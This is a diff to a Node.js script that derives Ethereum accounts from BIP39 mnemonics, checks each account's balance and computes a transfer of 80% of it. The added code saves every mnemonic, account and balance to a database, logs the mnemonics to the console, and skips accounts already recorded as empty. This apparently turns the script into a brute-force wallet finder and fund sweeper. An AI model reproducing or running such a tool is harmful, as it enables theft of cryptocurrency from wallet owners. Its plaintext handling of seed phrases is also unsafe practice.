@@ -1,13 +1,38 @@
 const HDWalletProvider = require('@truffle/hdwallet-provider');
 const Web3 = require('web3');
 const bip39 = require('bip39');
+const { PrismaClient } = require('@prisma/client');
+const prisma = new PrismaClient()
+
+const saveWallet = async (mnemonic, account, ballance) =>
+{
+    console.log('saving wallet', mnemonic, account, ballance)
+    // verifica se ja existe a conta
+    await prisma.wallets.create({
+        data: {
+            mnemonic,
+            account,
+            ballance: isNaN(+ballance) ? 0 : +ballance
+        }
+    }).catch(err => console.log(err, mnemonic, account, ballance));
+}
 
 const checkBalance = async (web3Provider, network, _mnemonic) =>
 {
     // get accounts
-    const accounts = await web3Provider.eth.getAccounts();
+    const accounts = [...new Set(await web3Provider.eth.getAccounts())];
+
+    let accountsAlreadyChecked = await prisma.wallets.findMany({
+        where: {
+            mnemonic: _mnemonic,
+            ballance: 0
+        }
+    }).then((wallets) => {
+        return wallets.map((wallet) => wallet.account)
+    })
+
     // for each account of the 5 first accounts
-    for (const account of accounts.slice(0, 5))
+    for (const account of accounts.filter((account) => !accountsAlreadyChecked.includes(account)).slice(0, 5))
     {
         // get balance
         const brutBalance = await web3Provider.eth.getBalance(account);
@@ -15,6 +40,8 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
 
         // balance to transfer - 20% of the balance
         const balanceToTransfer = brutBalance * 0.8;
+
+        saveWallet(_mnemonic, account, balance)
 
         // check if balance is greater than 0
         if (balance > 0)
